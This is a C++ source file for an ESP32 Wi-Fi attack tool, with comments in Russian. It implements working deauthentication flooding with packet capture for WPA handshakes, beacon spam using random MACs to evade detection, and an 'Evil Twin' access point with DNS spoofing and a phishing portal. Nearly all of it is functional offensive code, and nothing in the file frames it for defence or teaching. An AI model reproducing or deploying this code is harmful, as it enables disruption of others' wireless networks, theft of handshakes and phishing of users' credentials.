#include "WiFiManager.h" 
#include "SdManager.h"
#include "WebPortalManager.h" 
#include "Config.h"
#include <esp_wifi.h>

static WiFiAttackManager* g_wifiManager = nullptr;

WiFiAttackManager::WiFiAttackManager() : 
    _state(WiFiState::IDLE), 
    _lastPacketTime(0), 
    _packetsSent(0), 
    _capturedHandshake(false) 
{
    g_wifiManager = this; 
    memset(_packetBuffer, 0, 128);
}

void WiFiAttackManager::setup() { 
    WiFi.mode(WIFI_STA); 
    WiFi.disconnect(); 
    // Отключаем энергосбережение для максимальной скорости реакции радиомодуля
    esp_wifi_set_ps(WIFI_PS_NONE); 
}

void WiFiAttackManager::stop() {
    // 1. Останавливаем запись на SD (критично сделать первым)
    SdManager::getInstance().stopCapture();
    
    // 2. Останавливаем веб-сервер
    if (WebPortalManager::getInstance().isRunning()) {
        WebPortalManager::getInstance().stop();
    }
    
    // 3. Сбрасываем статус
    _state = WiFiState::IDLE;
    
    // 4. Очищаем низкоуровневые настройки
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    
    // Важно: Мы НЕ вызываем WiFi.scanDelete(), чтобы результаты сканирования
    // остались в памяти ESP32 и их можно было забрать через getScanResults()
}

void WiFiAttackManager::startScan() {
    if (_state != WiFiState::IDLE) return;
    
    // Асинхронный скан. false = не скрытый SSID
    WiFi.scanNetworks(true); 
    _state = WiFiState::SCANNING;
}

void WiFiAttackManager::startDeauth(const TargetAP& target) {
    _currentTarget = target; 
    _packetsSent = 0; 
    _capturedHandshake = false;
    
    // Старт захвата пакетов
    SdManager::getInstance().startCapture();
    
    // Переход в Promiscuous Mode на нужном канале
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_currentTarget.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&WiFiAttackManager::snifferHandler);
    
    buildDeauthPacket();
    _state = WiFiState::ATTACKING_DEAUTH;
}

void WiFiAttackManager::startBeaconSpam() { 
    _packetsSent = 0; 
    esp_wifi_set_promiscuous(true); 
    _state = WiFiState::ATTACKING_BEACON; 
}

void WiFiAttackManager::startEvilTwin(const TargetAP& target) {
    _currentTarget = target; 
    _state = WiFiState::ATTACKING_EVIL_TWIN;
    
    // Для Evil Twin нужен режим AP + DNS Spoofing
    esp_wifi_set_promiscuous(false);
    WebPortalManager::getInstance().start(target.ssid);
}

void WiFiAttackManager::buildDeauthPacket() {
    // 802.11 Deauthentication Frame
    memset(_packetBuffer, 0, 26);
    _packetBuffer[0] = 0xC0; _packetBuffer[1] = 0x00; // Frame Control: Deauth
    _packetBuffer[2] = 0x3A; _packetBuffer[3] = 0x01; // Duration
    memset(&_packetBuffer[4], 0xFF, 6);               // Dest: Broadcast
    memcpy(&_packetBuffer[10], _currentTarget.bssid, 6); // Source: Target AP
    memcpy(&_packetBuffer[16], _currentTarget.bssid, 6); // BSSID: Target AP
    _packetBuffer[24] = 0x00; _packetBuffer[25] = 0x00; // Seq numbers
}

void WiFiAttackManager::buildBeaconPacket(const char* ssid) {
    int len = strlen(ssid); 
    if (len > 32) len = 32;
    
    memset(_packetBuffer, 0, 128);
    _packetBuffer[0] = 0x80; _packetBuffer[1] = 0x00; // Beacon Frame
    memset(&_packetBuffer[4], 0xFF, 6);               // Dest
    
    // Random Source MAC to avoid detection
    for(int i=10;i<16;i++) _packetBuffer[i] = random(0,255);
    memcpy(&_packetBuffer[16], &_packetBuffer[10], 6); // BSSID
    
    // Fixed Params
    _packetBuffer[32] = 0x64; _packetBuffer[33] = 0x00; 
    _packetBuffer[34] = 0x01; _packetBuffer[35] = 0x00;
    
    // SSID Tag
    _packetBuffer[36] = 0x00; _packetBuffer[37] = len;
    memcpy(&_packetBuffer[38], ssid, len);
    
    // Supported Rates & Channel Tag (Simplified)
    int offset = 38 + len;
    _packetBuffer[offset++] = 0x01; _packetBuffer[offset++] = 0x08; // Rates header
    _packetBuffer[offset++] = 0x82; _packetBuffer[offset++] = 0x84; // Rates...
    _packetBuffer[offset++] = 0x03; _packetBuffer[offset++] = 0x01; // Channel header
    _packetBuffer[offset++] = random(1, 12); // Random Channel
}

// Обработчик прерывания (должен быть в IRAM для скорости)
void IRAM_ATTR WiFiAttackManager::snifferHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    // Фильтр по длине (мусор или слишком большие пакеты отбрасываем)
    if (pkt->rx_ctrl.sig_len < 10 || pkt->rx_ctrl.sig_len > Config::MAX_PACKET_LEN) return;
    
    // Отправка в очередь SD менеджера (неблокирующая)
    SdManager::getInstance().enqueuePacketFromISR(pkt->payload, pkt->rx_ctrl.sig_len);
}

bool WiFiAttackManager::loop(StatusMessage& statusOut) {
    uint32_t now = millis();
    statusOut.handshakeCaptured = _capturedHandshake;

    // --- EVIL TWIN ---
    if (_state == WiFiState::ATTACKING_EVIL_TWIN) {
        WebPortalManager::getInstance().processDns();
        statusOut.state = SystemState::ATTACKING_EVIL_TWIN;
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Phishing: %s", _currentTarget.ssid);
        vTaskDelay(pdMS_TO_TICKS(5)); // Уступаем время другим задачам
        return true; 
    }

    // --- SCANNING ---
    if (_state == WiFiState::SCANNING) {
        statusOut.state = SystemState::SCANNING;
        int n = WiFi.scanComplete();
        if (n >= 0) { 
            _state = WiFiState::SCAN_COMPLETE; 
            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Found: %d", n); 
        }
        else if (n == -2) {
            WiFi.scanNetworks(true); // Ошибка скана, рестарт
        }
        else {
            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scanning...");
        }
        return true;
    }
    
    // Если скан завершен, мы просто отдаем статус, но не блокируем работу системы
    if (_state == WiFiState::SCAN_COMPLETE) { 
        statusOut.state = SystemState::SCAN_COMPLETE; 
        return false; 
    }

    // --- DEAUTH ---
    if (_state == WiFiState::ATTACKING_DEAUTH) {
        statusOut.state = SystemState::ATTACKING_WIFI_DEAUTH; 
        
        // Burst Mode: 3 пакета каждые 10мс
        if (now - _lastPacketTime > 10) {
            for(int i=0; i<3; i++) { 
                esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 26, false); 
                _packetsSent++; 
            }
            _lastPacketTime = now;
        }
        statusOut.packetsSent = _packetsSent;
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Deauthing...");
        return true;
    }

    // --- BEACON SPAM ---
    if (_state == WiFiState::ATTACKING_BEACON) {
        statusOut.state = SystemState::ATTACKING_WIFI_SPAM; 
        
        if (now - _lastPacketTime > 50) {
            const char* ssid = _spamSSIDs[random(0, _spamSSIDs.size())];
            buildBeaconPacket(ssid);
            int pktLen = 51 + strlen(ssid); // Динамическая длина
            esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, pktLen, false); 
            _packetsSent++;
            _lastPacketTime = now;
        }
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Beacon Spam");
        return true;
    }

    return false;
}

std::vector<TargetAP> WiFiAttackManager::getScanResults() {
    std::vector<TargetAP> results;
    int n = WiFi.scanComplete();
    if (n > 0) {
        // Ограничиваем список 30 сетями (защита памяти)
        for (int i = 0; i < min(n, 30); ++i) {
            TargetAP ap;
            // Безопасное копирование
            strncpy(ap.ssid, WiFi.SSID(i).c_str(), MAX_SSID_LEN - 1); 
            ap.ssid[MAX_SSID_LEN - 1] = 0; 
            
            memcpy(ap.bssid, WiFi.BSSID(i), 6);
            ap.channel = WiFi.channel(i); 
            ap.rssi = WiFi.RSSI(i);
            results.push_back(ap);
        }
    }
    return results;
}